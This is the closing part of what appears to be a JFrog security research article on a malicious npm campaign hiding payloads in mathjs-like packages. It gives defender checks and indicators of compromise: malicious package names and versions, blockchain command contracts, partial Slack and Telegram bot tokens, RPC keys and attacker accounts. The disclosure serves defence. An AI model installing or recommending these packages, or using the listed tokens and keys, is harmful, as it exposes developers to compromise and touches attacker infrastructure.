+<th align="left">Scheduled downloads</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">events-sync</td>
+<td align="left">40,715,826</td>
+</tr>
+<tr>
+<td align="left">events-channel</td>
+<td align="left">38,217,963</td>
+</tr>
+<tr>
+<td align="left">indexed-btree</td>
+<td align="left">37,969,615</td>
+</tr>
+<tr>
+<td align="left">quick-events</td>
+<td align="left">37,896,325</td>
+</tr>
+<tr>
+<td align="left">btree-core</td>
+<td align="left">37,657,103</td>
+</tr>
+<tr>
+<td align="left">amm-strategy-backtester</td>
+<td align="left">19,060,693</td>
+</tr>
+<tr>
+<td align="left">@oliviamcdaniel12/safer-buffer</td>
+<td align="left">17,957,387</td>
+</tr>
+<tr>
+<td align="left">matrixflow-js</td>
+<td align="left">14,767,050</td>
+</tr>
+<tr>
+<td align="left">matrixhub</td>
+<td align="left">11,697,230</td>
+</tr>
+<tr>
+<td align="left">matrix-ops-core</td>
+<td align="left">10,890,210</td>
+</tr>
+</tbody>
+</table>
+<h2 id="what-we-could-not-answer"><a href="#what-we-could-not-answer" aria-hidden="true" tabindex="-1"><strong>What we could not answer</strong></a></h2>
+<ul>
+<li><strong>What the implant was told to do.</strong> Fifteen tasks payloads, all sealed under an ephemeral X25519 secret. The targeting of quantitative and DeFi developers is inferred from the lures and the lusolve trigger, not from a recovered payload.  </li>
+<li><strong>matrixflow-js@3.2.1.</strong> It keys on the caller's raw matrix, so there is no reduced search space; the value is almost certainly supplied by the operator alongside the lure.  </li>
+<li><strong>The pre-July inflation mechanism.</strong> At least one package with 2.56M downloads was inflated by something that is not the worker farm.</li>
+</ul>
+<h2 id="for-defenders"><a href="#for-defenders" aria-hidden="true" tabindex="-1"><strong>For defenders</strong></a></h2>
+<ul>
+<li>If you consume any mathjs-shaped package, check for two files that <strong>do not exist in upstream mathjs</strong>: lib/cjs/utils/event.js and lib/cjs/utils/graph.js. Their presence is conclusive and, unlike a hash, survives repacking.  </li>
+<li>A subwatcher file at mode 755 under lib/cjs/utils/ means the payload has already executed. A package LICENSE ending in REDISTRIBUTION REQUIRES INCLUSION OF THIS LICENSE. means the host is actively infected.  </li>
+<li>On the registry side, the durable signal is <strong>over a million downloads with zero dependent packages and zero dependent repositories</strong>. It held for every vehicle here. Note that npm's dependencies:\&#x3C;pkg> search qualifier is not supported and silently degrades to fuzzy matching; use ecosyste.ms or libraries.io for reverse-dependency data.  </li>
+<li>Behaviourally: any package exposing the mathjs API whose lusolve/lup path reaches crypto, path, child_process or https; a fixed ten-second poll to slack.com/api/conversations.history with no jitter; and outbound JSON-RPC to Sepolia from a developer workstation or build agent.  </li>
+<li>Rotate anything a compromised workstation could reach, and treat the clean-but-inflated packages listed below as pending rather than safe: the operators publish clean and weaponise roughly a day later.</li>
+</ul>
+<h2 id="summary"><a href="#summary" aria-hidden="true" tabindex="-1"><strong>Summary</strong></a></h2>
+<p>What we are watching is a sophisticated operation that has been running for months and is still evolving. Its lures are aimed at developers doing quantitative and DeFi work, and every layer of it changes on its own schedule: the trigger design differs from package to package, the command channel has two independent paths, and the packages, publisher accounts and GitHub organisations behind them are disposable, created in minutes and abandoned the moment a package is removed. A download farm gives each new package the look of an established library before it is weaponised, and it is still running as we write. JFrog customers using Xray and Curation can detect and block these malicious packages, and JFrog Catalog users can view the updated campaign package list with the "Equation of Compromise" label.</p>
+<p>Our investigation is continuing. There are payloads we have not decrypted, and an orchestrator we have not found, and the operators are still publishing. We will update this article as we learn more.</p>
+<h2 id="indicators-of-compromise"><a href="#indicators-of-compromise" aria-hidden="true" tabindex="-1"><strong>Indicators of compromise</strong></a></h2>
+<h3 id="malicious-packages-live-at-time-of-writing"><a href="#malicious-packages-live-at-time-of-writing" aria-hidden="true" tabindex="-1"><strong>Malicious packages, live at time of writing</strong></a></h3>
+<table>
+<thead>
+<tr>
+<th align="left">package</th>
+<th align="left">version</th>
+<th>date</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">modern-events</td>
+<td align="left">1.3.3, 1.3.4, 1.4.0, 1.4.1, 1.4.2, 1.4.3, 1.4.4, 1.5.0, 1.5.1, 1.5.2</td>
+<td>2026-03-03</td>
+<td>XRAY-968383</td>
+</tr>
+<tr>
+<td align="left">quick-events</td>
+<td align="left">2.1.3</td>
+<td>2026-04-23</td>
+<td>XRAY-990105</td>
+</tr>
+<tr>
+<td align="left">@ignacionunez91/keccak24</td>
+<td align="left">1.0.7</td>
+<td>2026-05-05</td>
+<td>XRAY-1005328</td>
+</tr>
+<tr>
+<td align="left">crypto-hasher</td>
+<td align="left">3.1.2, 3.1.3</td>
+<td>2026-05-06</td>
+<td>XRAY-1027597</td>
+</tr>
+<tr>
+<td align="left">events-router</td>
+<td align="left">2.1.4</td>
+<td>2026-05-22</td>
+<td>XRAY-990103</td>
+</tr>
+<tr>
+<td align="left">events-runtime</td>
+<td align="left">3.1.3, 3.2.0, 3.2.1, 3.2.3, 3.2.4, 3.3.0</td>
+<td>2026-06-08</td>
+<td>XRAY-1002132</td>
+</tr>
+<tr>
+<td align="left">sort-btree</td>
+<td align="left">2.1.6, 2.2.0</td>
+<td>2026-06-14</td>
+<td>XRAY-1007137</td>
+</tr>
+<tr>
+<td align="left">ordered-btree</td>
+<td align="left">3.2.2</td>
+<td>2026-06-18</td>
+<td>XRAY-1007133</td>
+</tr>
+<tr>
+<td align="left">indexed-btree</td>
+<td align="left">2.1.2</td>
+<td>2026-06-18</td>
+<td>XRAY-1089213</td>
+</tr>
+<tr>
+<td align="left">@andrewstory18/is-real-odd</td>
+<td align="left">2.0.3</td>
+<td>2026-06-30</td>
+<td>XRAY-1036540</td>
+</tr>
+<tr>
+<td align="left">@oliviamcdaniel12/safer-buffer</td>
+<td align="left">2.2.0, 2.2.1</td>
+<td>2026-07-10</td>
+<td>XRAY-1026861</td>
+</tr>
+<tr>
+<td align="left">mutex-forge</td>
+<td align="left">2.0.0, 2.0.1, 2.0.2</td>
+<td>2026-08-11</td>
+<td>XRAY-1051670</td>
+</tr>
+<tr>
+<td align="left">mutex-thread</td>
+<td align="left">1.3.0</td>
+<td>2026-08-14</td>
+<td>XRAY-1057196</td>
+</tr>
+<tr>
+<td align="left">mutex-core</td>
+<td align="left">2.1.2</td>
+<td>2026-08-17</td>
+<td>XRAY-1057451</td>
+</tr>
+<tr>
+<td align="left">matrixflow-js</td>
+<td align="left">3.2.1</td>
+<td>2026-08-18</td>
+<td>XRAY-1057446</td>
+</tr>
+<tr>
+<td align="left">mutex-plus</td>
+<td align="left">3.0.2</td>
+<td>2026-08-18</td>
+<td>XRAY-1057459</td>
+</tr>
+<tr>
+<td align="left">mutex-lite</td>
+<td align="left">1.4.2</td>
+<td>2026-08-18</td>
+<td>XRAY-1057455</td>
+</tr>
+<tr>
+<td align="left">matrixkit-js</td>
+<td align="left">1.0.0</td>
+<td>2026-08-24</td>
+<td>XRAY-1074505</td>
+</tr>
+<tr>
+<td align="left">mathsbase</td>
+<td align="left">1.0.1</td>
+<td>2026-08-27</td>
+<td>XRAY-1088056</td>
+</tr>
+<tr>
+<td align="left">math-universe</td>
+<td align="left">1.0.0, 1.0.1, 1.0.2</td>
+<td>2026-09-16</td>
+<td>XRAY-1088055</td>
+</tr>
+<tr>
+<td align="left">mathmain</td>
+<td align="left">1.0.0</td>
+<td>2026-09-17</td>
+<td>XRAY-1088058</td>
+</tr>
+<tr>
+<td align="left">graphcore-js</td>
+<td align="left">2.3.2, 2.3.4, 2.4.1, 2.4.2</td>
+<td>2026-03-17</td>
+<td>XRAY-962933</td>
+</tr>
+<tr>
+<td align="left">graphlib-js</td>
+<td align="left">1.2.0, 1.2.1, 1.2.2, 1.3.2, 1.3.3, 1.3.4</td>
+<td>2026-03-17</td>
+<td>XRAY-952425</td>
+</tr>
+<tr>
+<td align="left">events-channel</td>
+<td align="left">2.3.1, 2.3.2, 2.4.1</td>
+<td>2026-05-21</td>
+<td>TBA</td>
+</tr>
+</tbody>
+</table>
+<h3 id="pup-packages-inflated"><a href="#pup-packages-inflated" aria-hidden="true" tabindex="-1"><strong>PuP packages, inflated</strong></a></h3>
+<table>
+<thead>
+<tr>
+<th align="left">secure-library-loader</th>
+<th align="left">0.1.0 – 0.1.3</th>
+<th align="left">2026-08-25</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">matrixhub</td>
+<td align="left">6.15.0, 6.15.1</td>
+<td align="left">2026-08-25</td>
+</tr>
+<tr>
+<td align="left">matrix-ops-core</td>
+<td align="left">1.0.0-1.0.4</td>
+<td align="left">2026-08-31</td>
+</tr>
+</tbody>
+</table>
+<h3 id="c2-contracts"><a href="#c2-contracts" aria-hidden="true" tabindex="-1"><strong>C2 contracts</strong></a></h3>
+<p>Ethereum Sepolia<br>
+0x906f019AC38bB572a8f7d8b2cA662D624EDebaff   2026-03-05  WalletDataRegistry<br>
+0x2707BbD5CF9b2F7cE37e4913BADC0349272d48cf   2026-03-06  WalletDataRegistry<br>
+0x2a8536AdA44816Cb049778d24b75d795987D90b1   2026-03-06  WalletDataRegistry<br>
+0x4C0c9B92BB9647fAf45022BA55f02bB0950196de   2026-03-06  WalletDataRegistry<br>
+0xDe34270921D37124fd0b64ea3aE4c5062B467418   2026-03-10  WalletDataRegistry<br>
+0x315d47b401aC29e97893dec1c85aBBB2791ef2aA   2026-03-10  WalletDataRegistry<br>
+0x475B8659A33FB0C2bDB4c60ffdb92bC24d5c4015   2026-03-18  WalletDataRegistry<br>
+0xd5A4620278788AcCf388B7Ea5f35f849465728E7   2026-03-18  WalletDataRegistry<br>
+0x4b225b742eb31AD0DfD6bc00F8C55650b4394c18   2026-03-18  WalletDataRegistry<br>
+0x661e50E19f05E3c0d04fD75891456D1F0A24508D   2026-04-16  WalletDataRegistry<br>
+0xc0445F1b679DC46280A0f03F451bdf613b5A0feA   2026-06-08  WebDataRegistry<br>
+0x9E4dF8F253Eb439dd9538Fda30cC03B38fD3a631   2026-06-15  WebDataRegistry<br>
+0xE390863Dac96a7118C71227C2b099B50cF602D31   2026-06-18  WalletHelloWorld<br>
+Base Sepolia<br>
+0xac0bfC4C48A679b667732128278EACBA1c191894   2026-08-28  WalletHelloWorld</p>
+<p>source-level identifiers    PROTOCOL \= "HUBMSBAT"   PROTOCOL \= "HEIGUNSE"</p>
+<h3 id="network"><a href="#network" aria-hidden="true" tabindex="-1"><strong>Network</strong></a></h3>
+<p><strong>Slack:</strong><br>
+workspace A   tasking C0ATC9UKKA4   reporting C0B554AQF1S   operator U0B51HGMGJW / B0B5VRXPHKJ<br>
+xoxb-10914929427361-1091493…<br>
+xoxb-10751214461892-1089634…</p>
+<p>workspace B   tasking C0B8GEPFMK9   reporting C0B8XPGCKQS   operator U0B91JWCVT6 / B0B8Y0V8NUA<br>
+xoxb-11301867762550-11301869433…<br>
+xoxb-11307403103236-112897671279….<br>
+xoxb-11307403103236-11289767127…   (rotated)</p>
+<p><strong>Telegram:</strong><br>
+8717417715:AAGZ-24bqk9QAUh  chat -1003968723972<br>
+8961878831:AAG4WTbRUcbXI5U   chat -1003952553968, -1004489630130<br>
+8836581068:AAF1e0v1nbMEShE   operator monitoring tool, alerts to @server_alert_0630</p>
+<h3 id="rpc-provider-projects"><a href="#rpc-provider-projects" aria-hidden="true" tabindex="-1"><strong>RPC provider projects</strong></a></h3>
+<p>pair A   eth-sepolia.g.alchemy.com/v2/0E6xblLeXLnZSnn280R-O<br>
+sepolia.infura.io/v3/d3d6e819028346a0b973bd5dd371c468<br>
+pair B   eth-sepolia.g.alchemy.com/v2/D2-TbkB2m05WXSnSDOCDI<br>
+sepolia.infura.io/v3/dc7257d09fab42eca2c354c32fec1938<br>
+pair C   eth-sepolia.g.alchemy.com/v2/NObVGNvMv3xNnlHDx3QYc</p>
+<h3 id="files"><a href="#files" aria-hidden="true" tabindex="-1"><strong>Files</strong></a></h3>
+<p>lib/cjs/utils/event.js              loader<br>
+lib/cjs/utils/graph.js              stage 2, base64<br>
+lib/cjs/utils/fraction.js           stage 3, base64<br>
+lib/cjs/utils/bignumber/type.js     bundled ethers, ~1.5 MB<br>
+lib/cjs/utils/subwatcher            dropped payload, mode 755<br>
+LICENSE ending "REDISTRIBUTION REQUIRES INCLUSION OF THIS LICENSE."<br>
+Trigger blob: IapMCmvlemBnFaU+3GZ4oF2xOhnczTlDWTO3oCfrHkWp1lSpHdCaeG0qn2neIoTetyRJtQ==</p>
+<h3 id="inflation-infrastructure"><a href="#inflation-infrastructure" aria-hidden="true" tabindex="-1"><strong>Inflation infrastructure</strong></a></h3>
+<p>github.com/andrewstory18/worker1              … worker10<br>
+github.com/davidbabcock96/job_worker1         … job_worker10<br>
+github.com/azlanrahman322-creator/job-worker1 … job-worker10<br>
+github.com/UmajiHidekata/jobworker</p>
+<p>WASM md5  91e020c13cb97a6365135b53b0d0fe5f   identical across all 30<br>
+WASM key  npm_workvr_protect_key_v1          AES-256-GCM, hardcoded</p>
+<h3 id="accounts"><a href="#accounts" aria-hidden="true" tabindex="-1"><strong>Accounts</strong></a></h3>
+<table>
+<thead>
+<tr>
+<th align="left">npm account</th>
+<th align="left">Email</th>
+<th align="left">GitHub</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">tinystar8</td>
+<td align="left">tinystar368@proton.me</td>
+<td align="left">tinystar8</td>
+</tr>
+<tr>
+<td align="left">elenahorn97</td>
+<td align="left">elenahorn97@proton.me</td>
+<td align="left">mathubio</td>
+</tr>
+<tr>
+<td align="left">allendev12</td>
+<td align="left">allennightgale0812@outlook.com</td>
+<td align="left">allendev12 <em>(deleted)</em></td>
+</tr>
+<tr>
+<td align="left">linnianping</td>
+<td align="left">lin.n.ping@proton.me</td>
+<td align="left">MATRIXFLOW-JS</td>
+</tr>
+<tr>
+<td align="left">robert92</td>
+<td align="left">robertjohnson8601@…</td>
+<td align="left">—</td>
+</tr>
+<tr>
+<td align="left">hunterhicks18</td>
+<td align="left">hunterhicks18@proton.me</td>
+<td align="left">MatrixHub-Org</td>
+</tr>
+<tr>
+<td align="left">jamesmorse82</td>
+<td align="left">jamesmorse82@proton.me</td>
+<td align="left">Ops-Core</td>
+</tr>
+<tr>
+<td align="left">monawillis412</td>
+<td align="left">mona.willis@outlook.com</td>
+<td align="left">GRAPHCORE-JS</td>
+</tr>
+<tr>
+<td align="left">andrewstory18</td>
+<td align="left">andrew.story18@outlook.com</td>
+<td align="left">andrewstory18</td>
+</tr>
+<tr>
+<td align="left">davidbabcock96</td>
+<td align="left">david.babcock96@outlook.com</td>
+<td align="left">davidbabcock96</td>
+</tr>
+<tr>
+<td align="left">—</td>
+<td align="left">azlanrahman322@gmail.com</td>
+<td align="left">azlanrahman322-creator</td>
+</tr>
+<tr>
+<td align="left">—</td>
+<td align="left">mattpalmer0602@gmail.com</td>
+<td align="left">MattPalmer0602</td>
+</tr>
+<tr>
+<td align="left">weed0</td>
+<td align="left">tinystar368@gmail.com</td>
+<td align="left">UmajiHidekata</td>
+</tr>
+<tr>
+<td align="left">justin454</td>
+<td align="left">justin.campos454@outlook.com</td>
+<td align="left">Blustdp</td>
+</tr>
+<tr>
+<td align="left">gerrysmith2026</td>
+<td align="left">gerry.smith2026@outlook.com</td>
+<td align="left">gerrysmith2026</td>
+</tr>
+<tr>
+<td align="left">wesleymoses97</td>
+<td align="left">wesley.moses97@outlook.com</td>
+<td align="left">EVENTSKIT</td>
+</tr>
+<tr>
+<td align="left">josephjordan93</td>
+<td align="left">joseph.jordan93@outlook.com</td>
+<td align="left">josephjorden93</td>
+</tr>
+<tr>
+<td align="left">lesstafford24</td>
+<td align="left">lesstafford24@outlook.com</td>
+<td align="left">EVENTS-ROUTER</td>
+</tr>
+<tr>
+<td align="left">angelinaparrish18</td>
+<td align="left">angelinaparrish18@outlook.com</td>
+<td align="left">EVENTS-RUNTIME</td>
+</tr>
+<tr>
+<td align="left">—</td>
+<td align="left">bradley.steven93@outlook.com</td>
+<td align="left">—</td>
+</tr>
+<tr>
+<td align="left">—</td>
+<td align="left">ignacionunez91@outlook.com</td>
+<td align="left">—</td>
+</tr>
+<tr>
+<td align="left">moniquemeza22</td>
+<td align="left">moniquemeza22@outlook.com</td>
+<td align="left">GRAPHKITORG</td>
+</tr>
+<tr>
+<td align="left">ignacionunez91</td>
+<td align="left">ignacionunez91@outlook.com</td>
+<td align="left">SORT-BTREE, KECCAK24</td>
+</tr>
+</tbody>
+</table>
+<p><strong>GitHub organisations:</strong> QUICK-EVENTS · EVENTSKIT · POWEREVENTS · EVENTS-ROUTER · EVENTS-RUNTIME · EVENTS-CHANNEL · EVENTS-SYNC · EVENTS-SYNCE · MODERN-EVENTS · GRAPHCORE-JS · GRAPHLIB-JS · GRAPHKITORG · CRYPTO-HASHER · KECCAK24 · INDEXED-BTREE · BTREE-CORE · SORT-BTREE · ORDERED-BTREE · MUTEX-CORE · MUTEXTHREAD · MATRIXFLOW-JS · MatrixHub-Org · Ops-Core · </p>
+</section><!----></div></div></div></main><footer class="py-4 main-footer bg-black dark:bg-gray-950"><div class="container mx-auto px-2"><div class="flex w-full justify-center flex-col sm:flex-row sm:justify-between items-center flex-wrap gap-4"><div class="left"><div class="flex items-center gap-2"><a href="/" class="logo active"><img alt="JFrog Security Research" src="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg" width="40" srcset="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg 40w" sizes="(max-width: 40px) 100vw, 40px" class="g-image"></a></div></div><div class="right"><ul class="footer-menu flex flex-col sm:flex-row items-center"><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/terms-of-use/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Terms of Use
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/jfrog-cookies-policy/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Cookies Policy
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/privacy-policy/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Privacy Policy
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="#" rel="noopener noreferrer" target="_self" class="text-white ot-sdk-show-settings">
+              Cookies Settings
+            </a></li></ul></div></div><p class="sm:hidden text-center text-white pt-3">
+      ©2026 All Rights Reserved. JFrog Ltd.
+    </p></div></footer></div>
+    <script src="/assets/js/app.ab729a36.js" defer></script><script src="/assets/js/page--src--templates--real-time-post-vue.1835e8c8.js" defer></script><script data-vue-tag="ssr" type="text/javascript" charset="utf-8" data-body="true">
+    if (window.airgap) {
+      const cookieSettings = document.getElementById('cookie_settings') || document.querySelector('.ot-sdk-show-settings');
+      cookieSettings.href = "#";
+      cookieSettings.target = "_self";
+      cookieSettings.onclick = () => {
+        transcend.showConsentManager({ viewState: 'CompleteOptions' });
+      };
+    }
+  </script>
+  </body>
+</html>
